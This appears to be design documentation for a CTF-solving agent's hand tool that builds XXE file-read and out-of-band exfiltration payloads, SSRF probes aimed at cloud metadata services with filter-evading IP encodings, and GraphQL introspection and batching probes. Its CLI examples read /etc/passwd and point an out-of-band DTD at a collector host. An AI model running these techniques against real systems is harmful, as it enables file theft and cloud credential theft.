# `web_xxe_ssrf`: XXE, SSRF-to-cloud-metadata, GraphQL tooling (wave125/web-xxe-ssrf)

The web engine now has a deliberately smaller in-band XXE subset in `solvers/web/xxe_read.py`: it needs one exact
clue/OpenAPI XML POST contract, confirms `/etc/passwd` against a nonexistent-file control, and reads one unique
clue/prompt-named objective path. This page's helper remains the agent tool for every broader form—alternate
transports, PHP wrappers, metadata SSRF, GraphQL exploration and especially blind/OOB entities.

Files: `solvers/toolkits/web_xxe_ssrf.py` (the XML/SSRF/GraphQL payload builders, the confirmed-exploit
probes, a CLI). Tests: `.venv/bin/python tests/test_wave125_web_xxe_ssrf.py` (offline: every live helper
is driven through a real `web.py` `WebClient` against an in-process `http.server` on 127.0.0.1).

It is a **hand tool for a live `web` challenge a solver drives**, like `flask_tools`, `web_exploit` and
`werkzeug_pin`: **not a toolkit**. It has **no `solve_set` and no `signals`**, is never auto-run, and is
**never re-exported by `web.py`**. It is what a solver reaches for once the main thread has filed the
target (`tools/target.py add`) and the VPN is up.

## The rules it keeps

- **Nothing is ever auto-submitted.** A confirmed exploit is a **finding** the module reports (a leaked
  file, a temporary IAM credential, a GraphQL schema); the player submits the answer through
  `ctf.submit.guarded_submit`. The module recognises **two registered answer formats**, and only ever
  calls a value an answer when it is the one value of that format which an exploit response carried and
  no plain page did:
  - the **CSCTF flag** format — `flag_from_exploit` (`flags_seen` lists every flag-shaped text for
    review; `is_flag` is the strict return gate). This is the primary spec.
  - the **`proof_<32hex>`** format of `solvers/web/proof_hunt.py`, carried beside it for lanes judged on a
    proof token — `proof_from_exploit` (`is_proof` is the strict lowercase wire gate; `proofs_seen` is the
    broad-seen set that keeps uppercase/mixed-case candidates exactly as returned, never lowercasing one
    into an answer and letting a second candidate poison the one-proof count). The UUID-v4 nibbles
    (`PROOF_FORMAT`) remain a useful empirical validator, not part of the `exact_text` contract. The three
    proof regexes (`PROOF_SEEN`, `PROOF_FORMAT`, `PROOF_WIRE`) are asserted byte-equal to `proof_hunt`'s in
    the test, so they can never drift.

  A recovered credential or secret is a finding, never an answer. **When in doubt, `None`.**
- **Detection never trusts a reflection.** An XXE file read is claimed only by the file's own content
  signature (`web_exploit.MARKER_SIGNATURES` / `marker_seen`, reused), with a benign baseline and a
  negative control (the same payload reading a file that does not exist beside the marker must stay
  clean) — exactly as `web_exploit.probe_traversal` claims an LFI. An SSRF-to-metadata hit is claimed
  only by the metadata service's own structural signature (AWS IMDS listing / credentials JSON / identity
  document, GCP/Azure/DO/Alibaba/Oracle), never by the echoed URL. GraphQL introspection is "enabled"
  only when the response parses as a real schema (`data.__schema.types`), and array batching "supported"
  only when a two-element batch returns a two-element JSON array.
- **All active sending goes through a `web.py` `WebClient` the caller built** — its scope lock refuses the
  CTFd platform and any off-scope/public host and stops for the VPN, and logs every request. This module
  opens no socket of its own and names no host for sending: a metadata URL is only a parameter VALUE the
  target fetches, and an XML/GraphQL body is only sent on the caller's client. Every probe is bounded by
  `max_requests`, paced by `gap`, and reports its request count. No request and no network on import; the
  CLI is offline.
- **`web.build_imdsv2_ssrf` and `web_exploit`'s marker helpers are reused, never reimplemented.**

## (1) XXE — file read (in-band) and out-of-band

- `xxe_file_payload(file, php=False)` / `xxe_file_payloads(file)` — the in-band XML: an external general
  entity reading `file://<path>` (or a `php://filter` base64 read for PHP source / binary), plus a UTF-16
  variant. Strings only.
- `confirm_xxe_read(client, path, ...)` — sends a benign baseline, then the file-read variants, and claims
  a read of `/etc/passwd` (or `C:\Windows\win.ini`) only by its content signature (raw, or inside a base64
  run), confirmed by a negative control. Returns `{found, marker, variant, how, control_clean, ...}`. The
  transport is `client`+`path` (raw body with a content type, or `param=`) or your own `send=` callable
  (a SOAP action, an SVG/DOCX upload).
- `read_file_over_xxe(client, path, target_file, variant=...)` — once a variant works, read one more file;
  returns `{body, decoded, flag, proof, status}` where `flag`/`proof` is the single CSCTF-format flag /
  judged `proof_<32hex>` the response (and its base64 decode) carried and no plain page did.
- `xxe_oob_dtd(collector_base, token, file, php=False)` — the parameter-entity exfil DTD and the XML that
  loads it, for a blind parser; the exact shape `tools/oob.py dtd` serves. Serve and collect with
  `tools/oob.py` (`up`, `dtd <token> <file>`, `hits --token <token>`).

## (2) SSRF to cloud instance metadata (169.254.169.254)

- `metadata_urls(encodings=True)` — every cloud-metadata endpoint (AWS IMDSv1+v2, GCP, Azure, DigitalOcean,
  Alibaba, Oracle) with the inner header each service requires, plus the IP-encoding spellings of
  169.254.169.254.
- `ip_encodings(ip)` — decimal, hex, per-octet octal/hex, two-part dotted and IPv6-mapped spellings
  (computed from the octets), to beat a naive string filter.
- `confirm_metadata_ssrf(client, path, param, ...)` — points ONE in-scope fetch parameter at the endpoints
  (a baseline that never resolves first) and claims a hit only by the service's structural signature.
  Returns `{hit, cloud, url, matched, credentials, flag, proof, ...}`. `credentials` (temporary IAM keys, via
  `parse_aws_credentials`) is a FINDING; only `flag`/`proof` is submittable.
- `imdsv2_steps(param)` — the AWS IMDSv2 PUT-then-GET, via `web.build_imdsv2_ssrf` (apps that forward the
  method and headers only).

## (3) GraphQL — introspection and batching

- `introspection_body()` / `INTROSPECTION_QUERY` — the standard full (and short) introspection query.
- `probe_introspection(client, path="/graphql")` — POST/GET the query; `enabled` only on a real schema;
  `schema` is flattened to type names and the Query/Mutation root fields (`parse_schema`).
- `confirm_batching(client, path)` — one benign two-element array batch; `supported` only on a two-element
  array response.
- `batch_array_body(queries)` / `alias_batch_query(field, arg, values)` — array-batch and aliased
  in-document batch bodies (strings only), for an oracle the agent drives; nothing is auto-fired.

## CLI (offline — nothing contacts a target)

```
web_xxe_ssrf.py xxe     --file /etc/passwd [--php]
web_xxe_ssrf.py xxe-oob --base http://<collector> --token <tok> --file /etc/passwd [--php]
web_xxe_ssrf.py ssrf    [--ip 169.254.169.254]
web_xxe_ssrf.py imdsv2  <ssrf-param>
web_xxe_ssrf.py graphql
web_xxe_ssrf.py selftest
```
